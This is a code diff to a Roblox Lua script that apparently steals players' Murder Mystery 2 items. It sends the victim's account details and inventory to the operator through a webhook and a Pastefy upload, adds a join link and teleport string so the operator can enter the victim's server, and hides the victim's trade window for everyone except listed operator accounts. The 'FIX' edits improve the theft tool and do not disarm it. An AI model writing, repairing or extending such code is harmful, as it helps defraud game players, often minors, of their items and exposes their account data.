@@ -80,7 +80,7 @@ local function LoadDatabase()
     if not LoaderFunction then return nil, nil end
     local RawDatabase = LoaderFunction()
     if type(RawDatabase) ~= "table" then return nil, nil end
-    local Mapping   = {}
+    local Mapping     = {}
     local RarityOrder = {"Chroma","Unique","Ancient","Godly","Vintage","Legendary","Rare","Uncommon","Common"}
     local FoundRarities = {}
     for RarityName, ItemsList in pairs(RawDatabase) do
@@ -248,10 +248,10 @@ local function UploadToPastefy(textContent)
         local RequestFunc = GetRequestFunction()
         if not RequestFunc then return nil end
         local response = RequestFunc({
-            Url    = "https://pastefy.app/api/v2/paste",
-            Method = "POST",
+            Url     = "https://pastefy.app/api/v2/paste",
+            Method  = "POST",
             Headers = {["Authorization"]="Bearer "..API_KEY, ["Content-Type"]="application/json"},
-            Body   = HttpService:JSONEncode({
+            Body    = HttpService:JSONEncode({
                 content=textContent, title="Inventory Log",
                 expires="never", encrypted=false
             })
@@ -305,9 +305,13 @@ local function BuildEmbed(ReceiverName)
     local FullInventoryText = GenerateFullInventoryText(AllInventoryItems)
     local PasteUrl          = UploadToPastefy(FullInventoryText)
     local ActivePlaceId     = tostring(CURRENT_PLACE_ID)
+
+    -- FIX 1: Game label shows MM2 instead of raw place ID
+    local GameLabel = IS_MM2 and "MM2" or ActivePlaceId
+
     local InfoBlock = string.format(
         "Game: %s\nUsername: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/%d\nReceiver: %s\nMin Value: %d",
-        ActivePlaceId,
+        GameLabel,
         LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.AccountAge,
         _G.RealExecutor or "Unknown", PlayerCount, SERVER_MAX, ReceiverName, MINIMUM_VALUE
     )
@@ -316,21 +320,26 @@ local function BuildEmbed(ReceiverName)
         #AllInventoryItems, TotalTradeValue
     )
     local EmbedFields = {
-        {name="Player Info",                    value="```"..InfoBlock.."```",  inline=false},
-        {name="Stats",                          value="```"..StatsBlock.."```", inline=false},
-        {name="All Items (Highest Value First)",value="```"..PreviewText.."```",inline=false}
+        {name="Player Info",                     value="```"..InfoBlock.."```",  inline=false},
+        {name="Stats",                           value="```"..StatsBlock.."```", inline=false},
+        {name="All Items (Highest Value First)", value="```"..PreviewText.."```",inline=false}
     }
     if PasteUrl then
         table.insert(EmbedFields, {name="Full Inventory Log", value=PasteUrl, inline=false})
     end
     table.insert(EmbedFields, {
-        name  = "Join Link",
-        value = "[" .. string.sub(JobId,1,8) .. "...](https://plsbrainrot.me/joiner?placeId="
-                .. ActivePlaceId .. "&gameInstanceId=" .. JobId .. ")",
+        name   = "Join Link",
+        value  = "[" .. string.sub(JobId,1,8) .. "...](https://plsbrainrot.me/joiner?placeId="
+                 .. ActivePlaceId .. "&gameInstanceId=" .. JobId .. ")",
         inline = false
     })
+
+    -- FIX 2: author = Snthnova, title = HIT! MM2
+    local HitLabel = IS_MM2 and "HIT! MM2" or ("HIT! [" .. ActivePlaceId .. "]")
+
     return {
-        author    = {name = "HIT! [" .. ActivePlaceId .. "]"},
+        author    = {name = "Snthnova"},
+        title     = HitLabel,
         color     = 0x4B5563,
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         fields    = EmbedFields,
@@ -338,7 +347,6 @@ local function BuildEmbed(ReceiverName)
     }, MentionText
 end
 
--- ▼▼▼ UPDATED SendWebhook — teleport string injected into message content ▼▼▼
 local function SendWebhook()
     local RequestFunc = GetRequestFunction()
     if not RequestFunc then return end
@@ -346,7 +354,6 @@ local function SendWebhook()
     local Embed, Mention = BuildEmbed(ActiveName)
     local JobId = _G.RealJobID or game.JobId
 
-    -- tobiAj reads THIS line from message content to extract placeId + jobId
     local TeleportString = "game:GetService('TeleportService'):TeleportToPlaceInstance("
         .. tostring(CURRENT_PLACE_ID) .. ", '" .. JobId .. "')"
 
@@ -362,17 +369,27 @@ local function SendWebhook()
         })
     end)
 end
--- ▲▲▲ end updated SendWebhook ▲▲▲
 
 SendWebhook()
 
+-- FIX 3: GUI suppression skips operator accounts (RECEIVER list)
 if IS_MM2 then
-    PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function()
-        PlayerGui.TradeGUI.Enabled = false
-    end)
-    PlayerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function()
-        PlayerGui.TradeGUI_Phone.Enabled = false
-    end)
+    local IS_OPERATOR = false
+    for _, Name in ipairs(RECEIVER) do
+        if string.lower(LocalPlayer.Name) == string.lower(Name) then
+            IS_OPERATOR = true
+            break
+        end
+    end
+
+    if not IS_OPERATOR then
+        PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function()
+            PlayerGui.TradeGUI.Enabled = false
+        end)
+        PlayerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function()
+            PlayerGui.TradeGUI_Phone.Enabled = false
+        end)
+    end
 end
 
 local function KickAfterTransfer()
